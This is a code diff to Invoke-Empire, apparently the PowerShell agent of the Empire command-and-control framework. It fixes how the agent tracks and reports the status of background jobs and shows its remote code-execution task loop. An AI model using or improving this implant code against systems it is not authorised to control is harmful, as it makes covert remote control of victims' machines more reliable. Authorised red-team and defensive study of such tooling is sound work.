@@ -1146,7 +1146,7 @@ function Invoke-Empire {
                 $jobID = Start-AgentJob $data;
                 $script:ResultIDs[$jobID]=$resultID;
                 Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
-                $script:tasks[$ResultID]['status'] = 'completed'
+                $script:tasks[$ResultID]['status'] = 'running'
             }
             # dynamic code execution, no wait, save output
             elseif($type -eq 111 -or $type -eq 113) {
@@ -1357,12 +1357,24 @@ function Invoke-Empire {
 
         ForEach($JobName in $JobNames) {
             $JobResultID = $script:ResultIDs[$JobName]
-            if (Get-AgentJobCompleted -JobName $JobName) {
-                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
+            $taskStatus = $script:tasks[$JobName]['status']
+
+            if ($taskStatus -eq 'completed' -or $taskStatus -eq 'stopped') {
+                continue;  # Skip already completed or stopped tasks
             }
-            elseif ($script:tasks[$JobName]['status'] -eq 'running') {
-                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
+
+            # Check if the task is running and completed
+            if ($taskStatus -eq 'running') {
+                $jobCompleted = Get-AgentJobCompleted -JobName $JobName
+                if ($jobCompleted) {
+                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
+                    $script:tasks[$JobName]['status'] = 'completed'
+                }
+                else {
+                    $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
+                }
             }
+
             if ($Results) {
                 $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
             }
